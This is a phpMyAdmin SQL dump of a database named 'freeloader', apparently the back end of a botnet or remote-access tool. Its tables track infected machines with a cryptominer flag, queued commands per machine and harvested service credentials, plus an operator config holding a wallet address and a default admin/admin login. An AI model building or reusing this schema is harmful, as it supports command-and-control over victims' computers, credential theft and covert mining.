-- phpMyAdmin SQL Dump
-- version 4.7.4
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1
-- Generation Time: 01-Mar-2018 às 19:05
-- Versão do servidor: 10.1.30-MariaDB
-- PHP Version: 5.6.33

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `freeloader`
--

-- --------------------------------------------------------

--
-- Estrutura da tabela `agents`
--

CREATE TABLE `agents` (
  `id` varchar(100) CHARACTER SET latin1 NOT NULL,
  `display_name` varchar(100) CHARACTER SET latin1 DEFAULT NULL,
  `last_online` datetime DEFAULT NULL,
  `operating_system` varchar(100) CHARACTER SET latin1 DEFAULT NULL,
  `cpu` varchar(100) CHARACTER SET latin1 DEFAULT NULL,
  `gpu` varchar(100) CHARACTER SET latin1 DEFAULT NULL,
  `memory` varchar(100) CHARACTER SET latin1 DEFAULT NULL,
  `remote_ip` varchar(100) CHARACTER SET latin1 DEFAULT NULL,
  `geolocation` varchar(100) CHARACTER SET latin1 DEFAULT NULL,
  `output` text CHARACTER SET latin1,
  `hostname` text CHARACTER SET latin1,
  `username` varchar(100) CHARACTER SET latin1 DEFAULT NULL,
  `miner` char(1) COLLATE utf16_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf16 COLLATE=utf16_unicode_ci;

-- --------------------------------------------------------

--
-- Estrutura da tabela `commands`
--

CREATE TABLE `commands` (
  `id` int(11) NOT NULL,
  `agent_id` varchar(255) NOT NULL,
  `agent` int(11) NOT NULL,
  `cmdline` text NOT NULL,
  `timestamp` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Estrutura da tabela `credentials`
--

CREATE TABLE `credentials` (
  `id` int(11) NOT NULL,
  `service` varchar(255) NOT NULL,
  `email` varchar(255) NOT NULL,
  `password` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Estrutura da tabela `users_config`
--

CREATE TABLE `users_config` (
  `id` int(11) NOT NULL,
  `username` varchar(255) NOT NULL,
  `password` varchar(255) NOT NULL,
  `wallet` varchar(255) NOT NULL,
  `value_scheduled` varchar(100) NOT NULL,
  `email` varchar(100) NOT NULL,
  `password_email` varchar(100) NOT NULL,
  `smtp` varchar(100) NOT NULL,
  `port` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Extraindo dados da tabela `users_config`
--

INSERT INTO `users_config` (`id`, `username`, `password`, `wallet`, `value_scheduled`, `email`, `password_email`, `smtp`, `port`) VALUES
(1, 'admin', 'admin', '42We9qnxd2o1bhdqmQW57vc5C39sWyz3Q9bK1KduZniqc6BowXr5dhuZJDT8QBMDFecSVA8M46gLGKNiHaGY9yLU3MopbSc', '20.00', 'teste@teste.com', 'password', 'smtp-mail.outlook.com', 587);

--
-- Indexes for dumped tables
--

--
-- Indexes for table `agents`
--
ALTER TABLE `agents`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `commands`
--
ALTER TABLE `commands`
  ADD PRIMARY KEY (`id`),
  ADD KEY `agent_id` (`agent_id`);

--
-- Indexes for table `credentials`
--
ALTER TABLE `credentials`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `users_config`
--
ALTER TABLE `users_config`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `commands`
--
ALTER TABLE `commands`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2004;

--
-- AUTO_INCREMENT for table `credentials`
--
ALTER TABLE `credentials`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=112;

--
-- AUTO_INCREMENT for table `users_config`
--
ALTER TABLE `users_config`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- Constraints for dumped tables
--

--
-- Limitadores para a tabela `commands`
--
ALTER TABLE `commands`
  ADD CONSTRAINT `commands_ibfk_1` FOREIGN KEY (`agent_id`) REFERENCES `agents` (`id`);
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
